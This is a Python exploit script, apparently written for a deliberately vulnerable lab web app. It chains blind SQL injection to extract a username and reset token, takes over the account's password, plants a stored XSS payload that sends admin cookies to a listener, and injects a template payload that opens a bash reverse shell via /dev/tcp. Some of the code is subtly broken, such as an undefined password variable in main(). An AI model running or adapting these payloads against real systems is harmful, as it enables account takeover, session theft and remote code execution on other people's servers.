import requests
import sys
import random
import string
import socket
import time

"""
[+] Import Libraries
[+] Define proxy settings if needed (e.g., for debugging)
[+] Create session objects for HTTP requests
[+] Perform SQL injection by testing character by character
[+] Extract data using SQL injection for a given query
[+] Reset the password for the given username
[+] Change the password using the token
[+] Attempt to login with the given username and password
[+] Send XSS payload as a user
[+] Create a server to listen for incoming XSS data
[+] Send Server Side Template Injection (SSTI) payload
[+] Trigger the execution of the SSTI payload
"""

proxies = {"http": "127.0.0.1:8080"}

banner = """
████████╗██╗   ██╗██████╗  ██████╗ 
╚══██╔══╝██║   ██║██╔══██╗██╔═══██╗
   ██║   ██║   ██║██║  ██║██║   ██║
   ██║   ██║   ██║██║  ██║██║   ██║
   ██║   ╚██████╔╝██████╔╝╚██████╔╝
   ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ 
                                   
   @0x2nac0nda
"""

host = '0.0.0.0'
svcport = 80

sess = requests.Session()
adminsess = requests.Session()

def sql_injection(ip, inj_query):
    for i in range(32, 126):
        data = {"username": inj_query.replace("[CHAR]", str(i))}
        req = requests.post(f"http://{ip}//forgotusername.php", data=data)
        if "User exists!" in req.text:
            return i
    return None

def extract_data(ip, inject_query):
    extracted = ""
    for j in range(1, 60):
        inject = f"admin' and (select ascii(substring(({inject_query}),{j},1)))=[CHAR] --"
        ret_value = sql_injection(ip, inject)
        if ret_value:
            extracted += chr(ret_value)
            sys.stdout.write(chr(ret_value))
            sys.stdout.flush()
        else:
            break
    return extracted

def reset_password(ip, username):
    data = {"username": username}
    req = requests.post(f"http://{ip}/forgotpassword.php", data=data)
    if "Email sent!" in req.text:
        print(f"\n[+] Reset token for {username}")

def change_password(ip, token, password):
    data = {"token": token, "password1": password, "password2": password}
    req = requests.post(f"http://{ip}/resetpassword.php", data=data)
    if "Password changed!" in req.text:
        print(f"\n[+] Password changed to {password}")

def login(ip, username, password):
    data = {"username": username, "password": password}
    login_response = sess.post(f"http://{ip}/login.php", data=data, allow_redirects=False)
    if login_response.status_code == 302:
        print("[+] Login Success")
        return True

def send_xss(ip, lhost):
    data = {"description": f"<script>document.write('<img src=http://{lhost}/'+document.cookie+' />');</script>"}
    response = sess.post(f"http://{ip}/profile.php", data=data)
    if "My Profile:" in response.text:
        print("[+] XSS payload sent")
        return True

def server(host, lport):
    so = socket.socket()
    so.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    so.bind((host, lport))
    so.listen()
    print("[*] Server Running...")
    handler, _ = so.accept()
    data = handler.recv(4096)
    cookies = data.split(b"HTTP")[0][5:].decode("UTF-8")
    return cookies

def ssti(ip, admincookie, lhost, lport):
    data = {"message": f"{{php}}exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");{{/php}}"}
    adminsess.cookies.set("PHPSESSID", admincookie)
    req = adminsess.post(f"http://{ip}/admin/update_motd.php", data=data)
    if "Message set!" in req.text:
        print("[+] SSTI payload sent")
        return True

def trigger_ssti(ip):
    print("[+] Trigger SSTI Check your listener :)")
    req = adminsess.get(f"http://{ip}/index.php")
    if "admin Section" in req.text:
        return True

def main():
    if len(sys.argv) != 4:
        print(banner)
        print("(+) usage: {} <target> <LHOST> <LPORT>".format(sys.argv[0]))
        print('(+) eg: {} 172.17.0.1 172.17.0.2 443'.format(sys.argv[0]))
        sys.exit(-1)

    ip, lhost, lport = sys.argv[1], str(sys.argv[2]), int(sys.argv[3])
    print(banner)

    print("[+] Extract Username")
    username = extract_data(ip, "select username from users where uid=3")
    reset_password(ip, username)

    token = extract_data(ip, "select token from tokens where uid=3 limit 1")
    change_password(ip, token, ''.join(random.choice(string.ascii_letters) for _ in range(8)))

    if login(ip, username, password):
        print("[+] Login Success :)")
        send_xss(ip, host)
    session = server(host, svcport).split("=")[1]

    if ssti(ip, session, lhost, lport):
        time.sleep(10)
        trigger_ssti(ip)

if __name__ == "__main__":
    main()
